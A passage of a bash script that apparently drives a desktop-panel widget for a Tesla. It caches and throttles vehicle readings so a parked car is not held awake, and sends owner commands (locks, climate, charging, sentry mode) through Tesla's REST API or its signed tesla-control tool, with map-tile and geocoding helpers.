  vin=$(printf '%s' "$vehicle" | jq -r '.vin // empty')
  legacy_vin=$(jq -r '.vin // empty' "$legacy" 2>/dev/null)
  [ -n "$vin" ] && [ "$legacy_vin" = "$vin" ] || return 1
  cat "$legacy"
}

cmd_car() {
  if has_fixture; then
    serve_fixture
    return 0
  fi

  local vehicle
  vehicle=$(vehicle_json) || fail_json "$(vehicle_error)" "$(vehicle_hint)"

  local id cache state cached
  id=$(printf '%s' "$vehicle" | jq -r '.id_s // (.id|tostring)')
  cache=$(car_cache_path "$vehicle")
  cached=$(read_car_cache "$vehicle") || cached=""

  state=$(api "vehicles/$id" | jq -r '.response.state // empty' 2>/dev/null)
  [ -z "$(api_error)" ] || serve_cache_or_fail "$vehicle"
  [ -n "$state" ] || state=$(printf '%s' "$vehicle" | jq -r '.state // "unknown"')

  # Asleep or offline: the reading on disk is the only answer there is, and it
  # is the right one: a car that is asleep is a car that is parked, and a
  # parked car is where we last saw it.
  if [ "$state" != "online" ]; then
    serve_cache "$cached" "$state"
    return 0
  fi

  # Awake, but that does not make it ours to poll. A car sitting on the drive
  # with the doors just closed is online for another quarter of an hour, and
  # asking it anything during that window is what stops it dropping off.
  if [ "$FORCE" -ne 1 ] && [ -n "$cached" ]; then
    local age driving charging standing_open throttle
    age=$(( $(now) - $(number_or "$(printf '%s' "$cached" | jq -r '.at // empty' 2>/dev/null)" 0) ))
    driving=$(printf '%s' "$cached" | jq -r '.driving // false')
    charging=$(printf '%s' "$cached" | jq -r '.charging // "Unknown"')
    # A window does not hold a car awake; a door, a frunk or a boot does. Only
    # those earn the exception, so the summary is filtered rather than counted.
    standing_open=$(printf '%s' "$cached" \
      | jq -r '[(.open // [])[] | select(. != "a window")] | length > 0' 2>/dev/null)

    # Every exception is the same argument: the car is being held awake by
    # something that is not us, so a reading costs nothing it was not already
    # spending. Everything else waits out the park throttle.
    throttle=$(number_or "$PARK_THROTTLE" 900)
    [ "$charging" = "Charging" ] && throttle=$CHARGE_THROTTLE
    [ "$standing_open" = "true" ] && throttle=$OPEN_THROTTLE
    [ "$driving" = "true" ] && throttle=$DRIVE_THROTTLE

    if [ "$age" -lt "$throttle" ]; then
      serve_cache "$cached" "$state"
      return 0
    fi
  fi

  local response raw
  response=$(api "vehicles/$id/vehicle_data?endpoints=$(printf '%s' 'location_data;drive_state;charge_state;gui_settings;vehicle_state;vehicle_config;climate_state' | jq -sRr @uri)")
  raw=$(printf '%s' "$response" | jq -c '.response // empty' 2>/dev/null)

  # 408 is the documented answer from a car that went to sleep between the
  # state check and this call. Nothing to do about it and nothing to retry:
  # retrying is how you end up waking it.
  if [ -z "$raw" ]; then
    serve_cache "$cached" "asleep"
    return 0
  fi

  local reading
  reading=$(reading_json "$raw" "$state" true)
  printf '%s' "$reading" | write_private "$cache"
  printf '%s\n' "$reading"
}

# Tesla has stopped answering, but where the car was is still where the car is.
# The last reading goes out with the complaint attached, so the panel can show
# both rather than going blank about a car parked in a perfectly known place.
serve_cache_or_fail() {
  local vehicle="$1" cached=""
  cached=$(read_car_cache "$vehicle") || cached=""

  if [ -z "$cached" ]; then
    fail_json "$(api_error)" "$(api_hint)"
  fi

  printf '%s' "$cached" | jq -c --arg now "$(now)" --arg error "$(api_error)" --arg hint "$(api_hint)" \
    '. + {fresh: false, state: "unknown", error: $error, hint: $hint,
          age: (($now|tonumber) - (.at // 0))}'
  exit 0
}

# A cached reading, re-stamped so the panel can say how old it is, and marked
# stale so it can say so out loud.
serve_cache() {
  local cached="$1" state="$2"

  if [ -z "$cached" ]; then
    fail_json "no reading yet" "the car has not been awake since this was installed"
  fi

  printf '%s' "$cached" | jq -c --arg state "$state" --arg now "$(now)" \
    '. + {fresh: false, state: $state, age: (($now|tonumber) - (.at // 0))}'
}

# The one call that wakes a sleeping car, kept behind its own command so it
# can only ever happen because somebody asked for it.
cmd_wake() {
  local vehicle id
  vehicle=$(vehicle_json) || fail_json "$(api_error)" "$(api_hint)"
  id=$(printf '%s' "$vehicle" | jq -r '.id_s // (.id|tostring)')

  api "vehicles/$id/wake_up" POST >/dev/null 2>&1
  jq -cn '{ok: true, woken: true}'
}

# ----------------------------------------------------------------- commands
#
# Everything above this line reads. Everything from here on acts, and the two
# have opposite rules.
#
# Reading is throttled because a reading holds a parked car awake and that is
# how a car standing still loses a week of range. Acting has no such argument
# to make: nobody presses "lock the doors" idly, and a command that quietly
# refused because the car was asleep would be worse than useless — it would be
# a locked car you believed was locked. So a command wakes the car first, on
# purpose, and says so.
#
# Every command goes through send_command, which means all of them share one
# story about waking, one about how Tesla says no, and one about what happens
# to the reading on disk afterwards. There is no second path to the car.

# How long to wait for a woken car to answer for itself. Tesla's own apps give
# it about this long; a Model 3 on a cold morning is usually there in ten
# seconds, and one in an underground car park sometimes never is.
# ------------------------------------------------- the signed command path
#
# Tesla retired the REST command endpoints. As of the 2023-10-09 announcement,
# `POST /api/1/vehicles/{id}/command/...` answers 403 with
#
#   Tesla Vehicle Command Protocol required
#
# for everything except pre-2021 Model S and X, which stay on REST forever.
# Every other car — this includes every Model 3 and Y — now requires commands
# to be signed end to end with a key the *car itself* has whitelisted. Tesla's
# servers are no longer the authority; the car is.
#
# So there are two command paths here, and which one runs is decided by
# whether a command key exists on this machine:
#
#   command-key.pem present -> sign, and send via Tesla's own `tesla-control`
#   absent                  -> the old REST call, for the exempt S and X
#
# Signing is not something to reimplement. It is a protobuf dialect over an
# authenticated session with a replay counter, and Tesla ships the reference
# implementation. `tesla-control` is that implementation, and it is what runs.
#
# Enrolling the key is the one step that cannot happen from here: somebody has
# to be at the car with the NFC card. `tesla enroll` starts it.

COMMAND_KEY="$CONFIG_DIR/command-key.pem"
COMMAND_PUBKEY="$CONFIG_DIR/command-key.pub.pem"
FLEET_TOKEN_FILE="$CONFIG_DIR/fleet-token"

signed_mode() { [ -r "$COMMAND_KEY" ]; }

# The panel spawns this script from the shell, and the shell's PATH is not a
# login shell's: it has no ~/go/bin in it, which is exactly where a Go tool
# lands. Resolving it here rather than trusting PATH is the difference between
# the buttons working and the buttons working only from a terminal.
TESLA_CONTROL="${OMARCHY_TESLA_CONTROL:-}"
resolve_tesla_control() {
  [ -n "$TESLA_CONTROL" ] && return 0
  local candidate
  for candidate in "$(command -v tesla-control 2>/dev/null)" \
                   "$HOME/go/bin/tesla-control" \
                   /usr/local/bin/tesla-control /usr/bin/tesla-control; do
    if [ -n "$candidate" ] && [ -x "$candidate" ]; then
      TESLA_CONTROL="$candidate"
      return 0
    fi
  done
  return 1
}

have_tesla_control() { resolve_tesla_control; }

# The VIN the signed path addresses the car by. BLE has no account behind it —
# it finds the car by a name derived from the VIN — so this must not depend on
# the owner API being reachable. Configured VIN first, then the last reading,
# then and only then ask Tesla.
signed_vin() {
  local vehicle vin

  if [ -n "$VIN" ]; then printf '%s' "$VIN"; return 0; fi

  vin=$(find "$CACHE_DIR/cars" -name '*.json' -print0 2>/dev/null \
        | xargs -0 -r jq -r '.vin // empty' 2>/dev/null | head -n1)
  if [ -n "$vin" ]; then printf '%s' "$vin"; return 0; fi

  vehicle=$(vehicle_json 2>/dev/null) || return 1
  vin=$(printf '%s' "$vehicle" | jq -r '.vin // empty')
  [ -n "$vin" ] || return 1
  printf '%s' "$vin"
}

# BLE unless there is a Fleet API token to go over the internet with. BLE is
# the honest default: it needs no developer account, no hosted public key and
# no third party, and it works in a garage with no signal. What it needs is to
# be within Bluetooth range of the car.
tesla_control() {
  local vin
  resolve_tesla_control || { printf 'tesla-control is not installed\n' >&2; return 91; }
  vin=$(signed_vin) || { printf 'no VIN\n' >&2; return 90; }

  if [ -r "$FLEET_TOKEN_FILE" ]; then
    "$TESLA_CONTROL" -vin "$vin" -key-file "$COMMAND_KEY" \
      -token-file "$FLEET_TOKEN_FILE" \
      -connect-timeout 30s -command-timeout 20s "$@" 2>&1
  else
    "$TESLA_CONTROL" -ble -vin "$vin" -key-file "$COMMAND_KEY" \
      -connect-timeout 30s -command-timeout 20s "$@" 2>&1
  fi
}

# tesla-control reports failure in prose on stderr and, maddeningly, exits 0
# for some of it. So the output is what gets read, and the three answers worth
# recognising are turned into sentences. Everything else is passed through as
# it came, because a message we have not seen before is still better than
# "something went wrong".
signed_hint() {
  case "$1" in
    *INSUFFICIENT_PRIVILEGES*|*"not on the whitelist"*|*unauthorized*|*"has not been paired"*)
      printf '%s' "this key is not enrolled in the car — run: tesla enroll" ;;
    *"Failed to initialize BLE"*|*"can't init hci"*)
      printf '%s' "tesla-control needs CAP_NET_ADMIN: sudo setcap 'cap_net_admin,cap_net_raw=eip' \$(which tesla-control)" ;;
    *"context deadline exceeded"*|*"failed to find"*|*"no devices"*|*timeout*)
      printf '%s' "the car did not answer over Bluetooth — it has to be within about ten metres" ;;
    *"Unrecognized command"*|*"Usage:"*)
      printf '%s' "this car does not take that command over the signed protocol" ;;
    *) printf '' ;;
  esac
}

# One signed command. The arguments are tesla-control's own, verbatim, because
# translating them twice is one more place to get a seat number wrong.
run_signed() {
  local patch="$1"; shift
  local output vehicle

  if [ $# -eq 0 ]; then
    fail_json "not available on this car" \
      "Tesla's signed command protocol has no equivalent for this one"
  fi

  have_tesla_control || fail_json "tesla-control is not installed" \
    "build it from github.com/teslamotors/vehicle-command and put it on PATH"

  output=$(tesla_control "$@")

  # Silence is success. tesla-control prints nothing at all when a command
  # lands, and anything on the way out is a complaint.
  if [ -n "$output" ]; then
    local hint
    hint=$(signed_hint "$output")
    fail_json "$(printf '%s' "$output" | head -n1)" "$hint"
  fi

  vehicle=$(vehicle_json 2>/dev/null) && patch_car_cache "$vehicle" "$patch"
  jq -cn --arg command "$1" '{ok: true, command: $command, done: true, signed: true}'
}

# Start enrolling this machine's key in the car. Everything up to the tap
# happens here; the tap itself is somebody standing at the car with the black
# NFC card, holding it against the centre console when asked. There is no way
# to do that remotely, and that is the point of the whole protocol.
cmd_enroll() {
  local vin output

  have_tesla_control || die "tesla-control is not installed. Build it from github.com/teslamotors/vehicle-command"
  [ -r "$COMMAND_KEY" ] || die "no command key yet. Run: tesla-keygen -key-file $COMMAND_KEY create > $COMMAND_PUBKEY"

  vin=$(signed_vin) || die "no VIN to enrol against. Pass --vin"

  printf 'Enrolling this machine as a driver key on %s.\n\n' "$vin" >&2
  printf 'Be at the car. When this says so, hold your black NFC key card\n' >&2
  printf 'against the centre console, just behind the cup holders.\n\n' >&2

  output=$("$TESLA_CONTROL" -ble -vin "$vin" \
    -connect-timeout 40s -command-timeout 30s \
    add-key-request "$COMMAND_KEY" owner cloud_key 2>&1)

  if [ -n "$output" ]; then
    printf '%s\n' "$output" >&2
    printf '\nThat did not take. %s\n' "$(signed_hint "$output")" >&2
    exit 1
  fi

  printf 'Enrolled. Check it with: tesla keys\n' >&2
}

# What the car thinks is allowed to talk to it. Worth reading after an enrol,
# and worth reading before assuming a refusal is anything cleverer than a key
# that never landed.
cmd_keys() {
  local vin
  have_tesla_control || die "tesla-control is not installed"
  vin=$(signed_vin) || die "no VIN. Pass --vin"
  "$TESLA_CONTROL" -ble -vin "$vin" -key-file "$COMMAND_KEY" \
    -connect-timeout 30s list-keys
}

# Overridable so the tests can watch a car fail to wake without waiting the
# full three-quarters of a minute for it.
WAKE_TIMEOUT=$(number_or "${OMARCHY_TESLA_WAKE_TIMEOUT:-}" 45)
WAKE_POLL=$(number_or "${OMARCHY_TESLA_WAKE_POLL:-}" 2)

# A command is answered by the car, not by Tesla's records, so a sleeping car
# has to be woken before it can hear one. This is the one place in the script
# that wakes a car without a person having asked for `wake` by name, and it is
# justified the same way: they asked for something only an awake car can do.
#
# Returns 0 awake, 1 Tesla is not answering, 2 the car would not come round.
ensure_awake() {
  local id="$1" state deadline

  state=$(api "vehicles/$id" | jq -r '.response.state // empty' 2>/dev/null)
  [ -z "$(api_error)" ] || return 1
  [ "$state" = "online" ] && return 0

  api "vehicles/$id/wake_up" POST >/dev/null 2>&1

  deadline=$(( $(now) + WAKE_TIMEOUT ))
  while [ "$(now)" -lt "$deadline" ]; do
    sleep "$WAKE_POLL"
    state=$(api "vehicles/$id" | jq -r '.response.state // empty' 2>/dev/null)
    [ -z "$(api_error)" ] || return 1
    [ "$state" = "online" ] && return 0
  done

  return 2
}

# The last reading on disk describes a car that has since changed, in exactly
# the way we just changed it. Rather than throw it away — which would leave the
# panel with nothing to show about a car that is about to go back to sleep —
# the one field we know about is corrected in place. The panel asks for a fresh
# reading straight afterwards anyway; this is what it shows in the second
# before that lands, and what survives if the car sleeps before it does.
patch_car_cache() {
  local vehicle="$1" filter="$2" cache cached

  [ -n "$filter" ] || return 0
  cache=$(car_cache_path "$vehicle")
  cached=$(read_car_cache "$vehicle") || return 0
  printf '%s' "$cached" | jq -c "$filter" 2>/dev/null | write_private "$cache"
}

# The whole of the command path: pick the car, make sure it can hear us, say
# the thing, and be honest about the answer.
#
# Tesla answers a refused command with HTTP 200 and {"result": false} — the
# request was fine, the car simply said no — so the reason has to be read out
# of the body. Reading past it is how an app ends up reporting a locked car
# that is standing there with its doors open.
send_command() {
  local endpoint="$1" payload="${2-}" patch="${3-}"
  shift 3
  local vehicle id response result reason

  # The car decides, not Tesla's servers. Anything but a pre-2021 S or X needs
  # the command signed, and on this machine that means a command key exists.
  if signed_mode; then
    run_signed "$patch" "$@"
    return
  fi

  vehicle=$(vehicle_json) || fail_json "$(vehicle_error)" "$(vehicle_hint)"
  id=$(printf '%s' "$vehicle" | jq -r '.id_s // (.id|tostring)')

  ensure_awake "$id"
  case $? in
    1) fail_json "$(api_error)" "$(api_hint)" ;;
    2) fail_json "the car did not wake" \
         "it stayed asleep for ${WAKE_TIMEOUT}s — somewhere with no signal, most likely" ;;
  esac

  response=$(api "vehicles/$id/command/$endpoint" POST "$payload")
  [ -z "$(api_error)" ] || fail_json "$(api_error)" "$(api_hint)"

  result=$(printf '%s' "$response" | jq -r '.response.result // false' 2>/dev/null)
  reason=$(printf '%s' "$response" | jq -r '.response.reason // ""' 2>/dev/null)

  if [ "$result" != "true" ]; then
    [ -n "$reason" ] || reason="the car refused"
    fail_json "$reason" "$(command_hint "$endpoint" "$reason")"
  fi

  patch_car_cache "$vehicle" "$patch"
  jq -cn --arg command "$endpoint" '{ok: true, command: $command, done: true}'
}

# Tesla's refusals are terse to the point of being riddles, and the same three
# come up over and over. Spelling those out is the difference between a button
# that failed and a button that told you why.
command_hint() {
  local endpoint="$1" reason="$2"
  case "$reason" in
    *not_charging*)     printf '%s' "the car is not charging" ;;
    *is_charging*)      printf '%s' "the car is already charging" ;;
    *complete*)         printf '%s' "it is already at the charge limit" ;;
    *disabled*)         printf '%s' "turned off on the car's own screen" ;;
    *cable*|*plug*)     printf '%s' "the cable is still latched" ;;
    *user_not_present*) printf '%s' "the car wants somebody in the seat for this" ;;
    *)
      case "$endpoint" in
        window_control) printf '%s' "closing windows only works within a few hundred metres of the car" ;;
        trigger_homelink) printf '%s' "the car has to be near the door it is paired with" ;;
        *) printf '' ;;
      esac
      ;;
  esac
}

# --------------------------------------------------------------- arguments

# on / off, and nothing that merely looks like one. `tesla sentry maybe` is a
# typo, and a typo that silently turned sentry mode off would be the worst
# possible reading of it.
want_on() {
  case "${1-}" in
    on|true|yes|1)   printf 'true' ;;
    off|false|no|0)  printf 'false' ;;
    *) die "${2:-this} wants on or off" ;;
  esac
}

whole_number() {
  case "${1-}" in
    ''|*[!0-9]*) die "${2:-this} wants a whole number" ;;
  esac
  printf '%s' "$((10#$1))"
}

# A temperature, in whatever unit the car's own screen is set to, because that
# is the number the person is looking at. Tesla wants Celsius on the wire, so
# a car set to Fahrenheit converts here rather than asking anybody to do it in
# their head. The unit comes off the last reading; absent one, Celsius, which
# is what Tesla itself assumes.
#
# An explicit C or F on the end wins, for the case where you know better than
# the cache does.
celsius_from_display() {
  local input="$1" unit number

  case "$input" in
    *[cC]) unit=C; number="${input%?}" ;;
    *[fF]) unit=F; number="${input%?}" ;;
    *)     unit=$(cached_temp_unit); number="$input" ;;
  esac

  case "$number" in
    ''|*[!0-9.]*) die "temp wants a number, optionally ending C or F" ;;
  esac

  if [ "$unit" = "F" ]; then
    awk -v f="$number" 'BEGIN { printf "%.1f", (f - 32) / 1.8 }'
  else
    awk -v c="$number" 'BEGIN { printf "%.1f", c }'
  fi
}

cached_temp_unit() {
  local vehicle cached unit
  vehicle=$(vehicle_json 2>/dev/null) || { printf 'C'; return 0; }
  cached=$(read_car_cache "$vehicle" 2>/dev/null) || { printf 'C'; return 0; }
  unit=$(printf '%s' "$cached" | jq -r '.temp_unit // ""' 2>/dev/null)
  case "$unit" in *F*) printf 'F' ;; *) printf 'C' ;; esac
}

# Where the car was, for the two commands Tesla will only accept from someone
# standing near it. Taken from the last reading rather than asked for fresh:
# the car is about to be woken anyway, and a position good enough to close a
# window is one that was true a quarter of an hour ago.
cached_position() {
  local vehicle cached lat lon
  vehicle=$(vehicle_json 2>/dev/null) || return 1
  cached=$(read_car_cache "$vehicle" 2>/dev/null) || return 1
  lat=$(printf '%s' "$cached" | jq -r '.lat // empty' 2>/dev/null)
  lon=$(printf '%s' "$cached" | jq -r '.lon // empty' 2>/dev/null)
  [ -n "$lat" ] && [ -n "$lon" ] || return 1
  printf '%s %s' "$lat" "$lon"
}

# ---------------------------------------------------------------- doors

cmd_lock() {
  send_command door_lock '' '.locked = true' lock
}

cmd_unlock() {
  send_command door_unlock '' '.locked = false' unlock
}

# One command for both, because on a Model 3 the boot is a lid that goes both
# ways and the car decides which. `trunk` and `frunk` are separate words only
# because nobody has ever asked to "actuate the trunk".
cmd_trunk() {
  send_command actuate_trunk "$(jq -cn '{which_trunk: "rear"}')" '' trunk-move
}

cmd_frunk() {
  send_command actuate_trunk "$(jq -cn '{which_trunk: "front"}')" '' frunk-open
}

# Vent ignores the position; close will not happen unless Tesla believes you
# are near the car, which is a safety rule and not a bug to work around. The
# last known position is what we have, and it is the right thing to send: if
# the car has moved since, the command should fail, and it will.
cmd_windows() {
  local action="${1-}" lat=0 lon=0 position

  case "$action" in
    vent|close) ;;
    *) die "windows wants vent or close" ;;
  esac

  if [ "$action" = "close" ]; then
    position=$(cached_position) \
      || fail_json "no position" "closing the windows needs to know where the car is — refresh the panel first"
    lat=${position%% *}
    lon=${position##* }
  fi

  # The signed protocol asks for no position: the car knows the phone-key or
  # the Bluetooth radio talking to it is next to it, which is the same
  # proximity check the coordinates were standing in for over REST.
  send_command window_control \
    "$(jq -cn --arg c "$action" --arg lat "$lat" --arg lon "$lon" \
        '{command: $c, lat: ($lat|tonumber), lon: ($lon|tonumber)}')" \
    '' "windows-$action"
}

# --------------------------------------------------------------- security

cmd_sentry() {
  local on
  on=$(want_on "${1-}" sentry)
  send_command set_sentry_mode "$(jq -cn --argjson on "$on" '{on: $on}')" \
    "$(printf '.sentry = %s' "$on")" \
    sentry-mode "$(if [ "$on" = true ]; then printf on; else printf off; fi)"
}

# Valet mode takes a PIN only when you are setting one; Tesla accepts the
# command without it either way, and a PIN typed on a command line is a PIN in
# the shell history, so it stays optional and unmentioned in the usual case.
cmd_valet() {
  local on pin="${2-}"
  on=$(want_on "${1-}" valet)

  if [ -n "$pin" ]; then
    case "$pin" in
      [0-9][0-9][0-9][0-9]) ;;
      *) die "the valet PIN is four digits" ;;
    esac
    # The signed protocol has no PIN argument: valet-mode-on uses the PIN the
    # car already has. Setting a new one is a REST-era trick, and passing the
    # PIN on anyway would be passing it nowhere.
    send_command set_valet_mode \
      "$(jq -cn --argjson on "$on" --arg pin "$pin" '{on: $on, password: $pin}')" \
      '' "valet-mode-$(if [ "$on" = true ]; then printf on; else printf off; fi)"
  else
    send_command set_valet_mode "$(jq -cn --argjson on "$on" '{on: $on}')" \
      '' "valet-mode-$(if [ "$on" = true ]; then printf on; else printf off; fi)"
  fi
}

# Keyless driving, for two minutes. Named `drive` rather than
# `remote_start_drive` because that is what it is for, and kept out of the
# panel's own controls: a button that lets the car be driven away is not one
# to put next to "flash the lights".
cmd_drive() {
  send_command remote_start_drive '' '' drive
}

# ---------------------------------------------------------------- climate

cmd_climate() {
  local on
  on=$(want_on "${1-}" climate)
  if [ "$on" = "true" ]; then
    send_command auto_conditioning_start '' '.climate_on = true' climate-on
  else
    send_command auto_conditioning_stop '' '.climate_on = false' climate-off
  fi
}

# Both seats to the same number, which is what one number means. Tesla takes
# them separately and there is no reading in this widget that tells the two
# apart, so offering to set them differently would be offering a control whose
# effect you could not see.
cmd_temp() {
  local celsius
  [ $# -ge 1 ] || die "temp wants a number, optionally ending C or F"
  celsius=$(celsius_from_display "$1")
  # Snapped to the half degree the car itself works in. A Fahrenheit setpoint
  # converts to something like 21.666, and sending that asks the car for a
  # precision it does not have and cannot show back.
  celsius=$(jq -rn --argjson t "$celsius" '$t * 2 | round / 2')
  send_command set_temps \
    "$(jq -cn --argjson t "$celsius" '{driver_temp: $t, passenger_temp: $t}')" \
    "$(printf '.climate_setpoint_c = %s' "$celsius")" \
    climate-set-temp "${celsius}c"
}

cmd_defrost() {
  local on
  on=$(want_on "${1-}" defrost)
  # No signed equivalent. tesla-control has no max-defrost command, so on any
  # car that needs signing this is honestly unavailable rather than quietly
  # broken.
  send_command set_preconditioning_max "$(jq -cn --argjson on "$on" '{on: $on}')" \
    "$(printf '.defrost = %s' "$on")"
}

# Keep / Dog / Camp, the three things a car can do about its own cabin while
# you are not in it. `off` is the fourth, and the one you want in a hurry.
cmd_keeper() {
  local mode
  case "${1-}" in
    off)   mode=0 ;;
    keep|on) mode=1 ;;
    dog)   mode=2 ;;
    camp)  mode=3 ;;
    *) die "keeper wants off, keep, dog or camp" ;;
  esac
  # No signed equivalent either, for the same reason as defrost.
  send_command set_climate_keeper_mode \
    "$(jq -cn --argjson m "$mode" '{climate_keeper_mode: $m}')" \
    "$(printf '.climate_keeper = %s' "$mode")"
}

# Tesla numbers the seats with a gap in it — 3 is not a seat — so the names are
# the interface and the numbers stay in here.
cmd_seat() {
  local seat level

  case "${1-}" in
    front-left|driver)   seat=0 ;;
    front-right|passenger) seat=1 ;;
    rear-left)           seat=2 ;;
    rear-center|rear-centre) seat=4 ;;
    rear-right)          seat=5 ;;
    *) die "seat wants front-left, front-right, rear-left, rear-center or rear-right" ;;
  esac

  level=$(whole_number "${2-}" seat)
  [ "$level" -le 3 ] || die "a seat heater goes from 0 to 3"

  # The two protocols name the same seat differently, and neither name is
  # wrong. REST counts with a hole at 3; the signed one spells out the row.
  local tc_seat tc_level
  case "${1-}" in
    front-left|driver)   tc_seat=front-left ;;
    front-right|passenger) tc_seat=front-right ;;
    rear-left)           tc_seat=2nd-row-left ;;
    rear-center|rear-centre) tc_seat=2nd-row-center ;;
    rear-right)          tc_seat=2nd-row-right ;;
  esac
  case "$level" in
    0) tc_level=off ;; 1) tc_level=low ;; 2) tc_level=medium ;; 3) tc_level=high ;;
  esac

  send_command remote_seat_heater_request \
    "$(jq -cn --argjson h "$seat" --argjson l "$level" '{heater: $h, level: $l}')" \
    '' seat-heater "$tc_seat" "$tc_level"
}

cmd_wheel() {
  local on
  on=$(want_on "${1-}" wheel)
  send_command remote_steering_wheel_heater_request \
    "$(jq -cn --argjson on "$on" '{on: $on}')" \
    "$(printf '.wheel_heater = %s' "$on")" \
    steering-wheel-heater "$(if [ "$on" = true ]; then printf on; else printf off; fi)"
}

# --------------------------------------------------------------- charging

cmd_charge() {
  case "${1-}" in
    start) send_command charge_start '' '.charging = "Charging"' charging-start ;;
    stop)  send_command charge_stop '' '.charging = "Stopped"' charging-stop ;;
    *) die "charge wants start or stop" ;;
  esac
}

cmd_port() {
  case "${1-}" in
    open)  send_command charge_port_door_open '' '' charge-port-open ;;
    close) send_command charge_port_door_close '' '' charge-port-close ;;
    *) die "port wants open or close" ;;
  esac
}

cmd_limit() {
  local percent
  percent=$(whole_number "${1-}" limit)
  # Below 50 the car declines and above 100 there is nothing to decline; the
  # floor is Tesla's, not ours, and saying so beats a refusal with no reason.
  [ "$percent" -ge 50 ] && [ "$percent" -le 100 ] \
    || die "the charge limit goes from 50 to 100"
  send_command set_charge_limit "$(jq -cn --argjson p "$percent" '{percent: $p}')" \
    "$(printf '.charge_limit = %s' "$percent")" \
    charging-set-limit "$percent"
}

# Amps, for a car on a household socket that is tripping something. The car
# clamps this to what the connector can actually carry, so the range here is
# only about catching a typo.
cmd_amps() {
  local amps
  amps=$(whole_number "${1-}" amps)
  [ "$amps" -ge 1 ] && [ "$amps" -le 80 ] || die "charging amps go from 1 to 80"
  send_command set_charging_amps "$(jq -cn --argjson a "$amps" '{charging_amps: $a}')" \
    '' charging-set-amps "$amps"
}

# ------------------------------------------------------------------ alerts

cmd_horn()  { send_command honk_horn '' '' honk; }
cmd_flash() { send_command flash_lights '' '' flash-lights; }

# The garage door, and only the one the car is standing in front of. Tesla
# checks the position itself and refuses from anywhere else, which is the
# whole point of the feature.
cmd_homelink() {
  local position lat lon
  position=$(cached_position) \
    || fail_json "no position" "HomeLink needs to know where the car is — refresh the panel first"
  lat=${position%% *}
  lon=${position##* }
  # No signed equivalent; HomeLink stayed behind on REST.
  send_command trigger_homelink \
    "$(jq -cn --arg lat "$lat" --arg lon "$lon" '{lat: ($lat|tonumber), lon: ($lon|tonumber)}')"
}

# Send a destination to the car's navigation, the same way the phone app's
# share sheet does. Tesla geocodes the text itself, so anything you would type
# into a maps search works.
cmd_nav() {
  local destination="$*"
  [ -n "$destination" ] || die "nav wants somewhere to go"
  # No signed equivalent; navigation sharing stayed behind on REST too.
  send_command share \
    "$(jq -cn --arg d "$destination" --arg ms "$(( $(now) * 1000 ))" '
        {type: "share_ext_content_raw",
         value: {"android.intent.extra.TEXT": $d},
         locale: "en-US",
         timestamp_ms: $ms}')"
}

# --------------------------------------------------------------------- maps

# Slippy-map arithmetic, the same everyone uses: the world at zoom z is a grid
# of 2^z square tiles, and a coordinate lands at a fractional position in it.
#
# What comes back is a list of tiles with the pixel position each one takes
# inside the view, so the QML can lay them out without knowing any of this.
# Stitching them into one image here would need an image tool this script has
# deliberately not got.
cmd_map() {
  local lat="$1" lon="$2" zoom="$3" width="$4" height="$5"

  case "$lat$lon$zoom$width$height" in
    *[!0-9.\-]*) fail_json "map wants numbers" ;;
  esac

  local plan
  plan=$(awk -v lat="$lat" -v lon="$lon" -v z="$zoom" -v w="$width" -v h="$height" '
    BEGIN {
      pi = 3.14159265358979
      size = 256
      n = 2 ^ z
      rad = lat * pi / 180
      # Web Mercator: longitude is linear, latitude runs through the log-tangent.
      fx = (lon + 180) / 360 * n
      fy = (1 - log((sin(rad) / cos(rad)) + (1 / cos(rad))) / pi) / 2 * n

      # Where the car sits in world pixels, and the window we want around it.
      cx = fx * size
      cy = fy * size
      left = cx - w / 2
      top  = cy - h / 2

      x0 = int(left / size); if (left < 0 && left != x0 * size) x0--
      y0 = int(top  / size); if (top  < 0 && top  != y0 * size) y0--
      x1 = int((left + w - 1) / size); if ((left + w - 1) < 0) x1--
      y1 = int((top  + h - 1) / size); if ((top  + h - 1) < 0) y1--

      # The car is dead centre by construction; printing it keeps the QML from
      # having to trust that.
      printf "car %d %d\n", int(w / 2 + 0.5), int(h / 2 + 0.5)

      for (ty = y0; ty <= y1; ty++) {
        for (tx = x0; tx <= x1; tx++) {
          # Off the top or bottom of the world there is no tile; wrap around
          # the date line rather than asking for a column that does not exist.
          if (ty < 0 || ty >= n) continue
          wx = tx % n; if (wx < 0) wx += n
          printf "tile %d %d %d %d\n", wx, ty, int(tx * size - left + 0.5), int(ty * size - top + 0.5)
        }
      }
    }')

  local car_x car_y
  car_x=$(printf '%s' "$plan" | awk '/^car/ {print $2}')
  car_y=$(printf '%s' "$plan" | awk '/^car/ {print $3}')

  local tiles="[]"
  while read -r _ tx ty px py; do
    [ -n "${tx:-}" ] || continue
    local path
    path=$(fetch_tile "$zoom" "$tx" "$ty") || continue
    tiles=$(printf '%s' "$tiles" | jq -c --arg path "$path" --argjson px "$px" --argjson py "$py" \
      '. + [{path: $path, x: $px, y: $py}]')
  done < <(printf '%s' "$plan" | grep '^tile')

  jq -cn --argjson tiles "$tiles" --argjson w "$width" --argjson h "$height" \
    --argjson cx "${car_x:-0}" --argjson cy "${car_y:-0}" --argjson z "$zoom" '
    {ok: true, width: $w, height: $h, zoom: $z, tileSize: 256,
     carX: $cx, carY: $cy, tiles: $tiles,
     attribution: "© OpenStreetMap contributors"}'
}

# Tiles are immutable for practical purposes, so one that is on disk is never
# fetched again. This is the whole of being a good guest on a free tile server.
fetch_tile() {
  local z="$1" x="$2" y="$3"
  local dir="$CACHE_DIR/tiles/$(printf '%s' "$TILE_URL" | md5sum | cut -c1-8)/$z/$x"
  local path="$dir/$y.png"

  if [ -s "$path" ]; then printf '%s' "$path"; return 0; fi

  ( umask 077; mkdir -p "$dir" )
  local url="${TILE_URL//\{z\}/$z}"
  url="${url//\{x\}/$x}"
  url="${url//\{y\}/$y}"

  if curl -sS -f -m 20 -A "$MAP_UA" -o "$path.part" "$url" 2>/dev/null && [ -s "$path.part" ]; then
    mv -f "$path.part" "$path"
    printf '%s' "$path"
    return 0
  fi

  rm -f "$path.part"
  return 1
}

# Where the car is, in words. Nominatim asks for no more than one call a
# second and would rather you cached; coordinates are rounded to about ten
# metres first, so a car sitting still is one lookup however often you look.
#
# Formatting lives in place.jq, next to this script: country of the pin
# decides number-first vs number-last, and US/CA/AU get a region suffix.
# The parked line is `place`. The panel drops the house number on screen
# while moving; this cache is keyed by coordinates, so it does not change.
cmd_place() {
  local lat="$1" lon="$2"
  local key path response formatted

  # Same check `map` makes. These are pasted straight into a query string, and
  # a coordinate that is not a number is not a coordinate.
  case "$lat$lon" in
    *[!0-9.\-]*|'') fail_json "place wants numbers"; return 0 ;;
  esac

